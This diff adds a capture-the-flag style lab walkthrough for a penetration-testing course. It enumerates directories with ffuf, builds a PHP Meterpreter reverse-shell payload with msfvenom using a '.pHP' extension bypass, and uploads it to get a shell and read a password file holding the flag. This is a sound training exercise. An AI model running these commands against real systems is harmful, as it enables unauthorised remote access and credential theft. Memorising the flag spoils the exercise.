@@ -1,0 +1,49 @@
+Questions
+Use msfvenom to create a PHP web shell (bind or reverse shell), rename the PHP file extension to .pHP (as we did in the Module "Common Web Application Attacks" in the section "Using Executable Files"), and upload it to VM #2 to obtain an interactive shell. The flag is located in C:\xampp\passwords.txt.
+
+Hint
+1) Conduct directory enumeration using a wordlist, such as /usr/share/wordlists/wfuzz/general/megabeast.txt, and tools like ffuf, wfuzz, or dirbuster.
+2) Investigate the discovered directories for any file upload functionality.
+3) Generate a PHP payload (php/reverse_php) using msfvenom, ensuring that the file extension is set to .pHP as specified in the exercise.
+4) Upload your shell, and once you've accessed it from the uploaded location, you should gain shell access through your netcat listener.
+
+ffuf -w /usr/share/wordlists/wfuzz/general/megabeast.txt -u http://192.168.194.189/FUZZ -r
+...
+dashboard               [Status: 200, Size: 7576, Words: 1305, Lines: 168, Duration: 6ms]
+
+meteor                  [Status: 200, Size: 6286, Words: 1716, Lines: 160, Duration: 13ms]
+...
+
+# Where meteor do have a upload file functions which we can exploit
+http://192.168.194.189/meteor
+
+msfvenom -l payloads 
+php/meterpreter/reverse_tcp
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -o Cute.pHP
+
+# Use msfconsole to listen the exploit port
+sudo msfconsole
+use multi/handler
+set payload php/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORT 443
+
+# Upload the pHP payload and access to below link
+http://192.168.194.189/meteor/uploads/Cute.pHP
+[*] Meterpreter session 1 opened (192.168.45.182:443 -> 192.168.194.189:63549) at 2024-05-09 07:48:58 -0700
+
+msf6 exploit(multi/handler) > sessions 1
+meterpreter> shell
+C:\xampp\htdocs\meteor\uploads> cd C:\xampp
+C:\xampp\htdocs\meteor\uploads> dir
+
+
+PS C:\xampp> cat passwords.txt
+cat passwords.txt
+...
+5) SuperPassword (For everything):
+   User: mountainadmin
+   Password: OS{657b28dcc867e6078842a81fe7f6fcd4}
+   Attention: This user can do everything in our company.. Use with care!
+...
